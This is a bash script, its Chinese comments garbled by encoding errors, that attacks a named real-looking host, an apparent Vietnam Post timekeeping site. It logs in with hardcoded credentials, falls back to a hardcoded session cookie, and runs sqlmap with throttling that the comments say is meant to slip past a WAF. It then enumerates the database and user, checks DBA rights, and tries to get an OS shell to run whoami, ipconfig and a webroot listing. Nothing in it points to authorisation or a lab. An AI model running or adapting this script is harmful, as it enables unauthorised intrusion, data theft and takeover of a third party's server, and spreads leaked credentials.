#!/bin/bash

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ Step 1: é‡æ–°ç™»å½•è·å–æœ‰æ•ˆCookie"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

BASE="http://vps.vnpost.vn/chamcong"
USER="KVMBTCVP"
PASS="123"

# è·å–ç™»å½•é¡µé¢çš„ViewState
echo "  [1] è·å–ç™»å½•é¡µé¢..."
login_page=$(curl -sk "${BASE}/login.aspx" -c login_cookies.txt 2>&1)

VS=$(echo "$login_page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$login_page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$login_page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

echo "    ViewState: ${VS:0:50}..."

# ç™»å½•
echo ""
echo "  [2] ç™»å½•: $USER:$PASS"
curl -sk "${BASE}/login.aspx" \
    -X POST \
    -b login_cookies.txt \
    -c valid_cookies.txt \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "tUser=$USER" \
    --data-urlencode "tPass=$PASS" \
    --data-urlencode "tOk=ÄÄƒng nháº­p" \
    -L \
    -o login_result.html 2>&1

# æå–Session ID
SESSION=$(grep "ASP.NET_SessionId" valid_cookies.txt | awk '{print $7}')

if [ -n "$SESSION" ]; then
    echo "    âœ… ç™»å½•æˆåŠŸï¼"
    echo "    Session: $SESSION"
else
    echo "    âŒ ç™»å½•å¤±è´¥ï¼Œä½¿ç”¨å¤‡ç”¨Cookie"
    SESSION="bezu1wgtbs241i4cyhxapaou"
fi

# éªŒè¯Cookie
echo ""
echo "  [3] éªŒè¯Cookieæœ‰æ•ˆæ€§..."
TEST_URL="${BASE}/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP"

curl -sk "$TEST_URL" \
    -H "Cookie: ASP.NET_SessionId=$SESSION" \
    -o test_access.html 2>&1

if grep -qi "SessionTimeout\|Object moved" test_access.html; then
    echo "    âŒ Cookieæ— æ•ˆ"
    exit 1
else
    size=$(wc -c < test_access.html)
    echo "    âœ… Cookieæœ‰æ•ˆï¼å“åº”: $size bytes"
fi

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ Step 2: sqlmapæ‰«æï¼ˆä½çº¿ç¨‹ç»•WAFï¼‰"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# ç›®æ ‡URLï¼ˆä¸è¦URLç¼–ç ï¼Œsqlmapä¼šè‡ªåŠ¨å¤„ç†ï¼‰
TARGET="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP"

echo "  ç›®æ ‡: $TARGET"
echo "  Cookie: ASP.NET_SessionId=$SESSION"
echo ""

# sqlmapå‘½ä»¤ï¼ˆä½çº¿ç¨‹ + å»¶è¿Ÿ + tamperï¼‰
echo "  [1] æ£€æµ‹SQLæ³¨å…¥..."

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --random-agent \
    --batch \
    --threads=1 \
    --delay=1 \
    --timeout=20 \
    --level=2 \
    --risk=2 \
    --technique=BT \
    --dbms=mssql \
    -v 0 \
    2>&1 | tee sqlmap_detection.txt

echo ""
echo "  æ£€æµ‹ç»“æœ:"
tail -30 sqlmap_detection.txt

# æ£€æŸ¥æ˜¯å¦å‘ç°æ³¨å…¥
if grep -qi "injectable\|vulnerable" sqlmap_detection.txt; then
    echo ""
    echo "  ğŸ”¥ğŸ”¥ğŸ”¥ å‘ç°SQLæ³¨å…¥ï¼ç»§ç»­åˆ©ç”¨..."
    
    echo ""
    echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
    echo "ğŸ”¥ Step 3: è·å–æ•°æ®åº“ä¿¡æ¯"
    echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
    
    echo "  [1] å½“å‰æ•°æ®åº“..."
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        --current-db \
        -v 0 \
        2>&1 | tee sqlmap_currentdb.txt
    
    echo ""
    echo "  [2] å½“å‰ç”¨æˆ·..."
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        --current-user \
        -v 0 \
        2>&1 | tee sqlmap_user.txt
    
    echo ""
    echo "  [3] æ˜¯å¦DBA..."
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        --is-dba \
        -v 0 \
        2>&1 | tee sqlmap_dba.txt
    
    echo ""
    echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
    echo "ğŸ”¥ Step 4: å°è¯•os-shellï¼ˆGetShellï¼‰"
    echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
    
    echo "  å°è¯•è·å–os-shell..."
    
    # åˆ›å»ºsqlmapäº¤äº’è¾“å…¥
    cat > sqlmap_commands.txt << 'EOF'
whoami
hostname
ipconfig
dir C:\inetpub\wwwroot\chamcong
exit
EOF
    
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        --os-shell \
        -v 0 \
        < sqlmap_commands.txt \
        2>&1 | tee sqlmap_osshell.txt
    
    echo ""
    echo "  os-shellç»“æœ:"
    cat sqlmap_osshell.txt | tail -50
    
else
    echo ""
    echo "  âŒ æœªæ£€æµ‹åˆ°SQLæ³¨å…¥"
fi

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… sqlmapæ‰§è¡Œå®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

echo ""
echo "ğŸ“Š ç»“æœæ–‡ä»¶:"
ls -lh sqlmap_*.txt
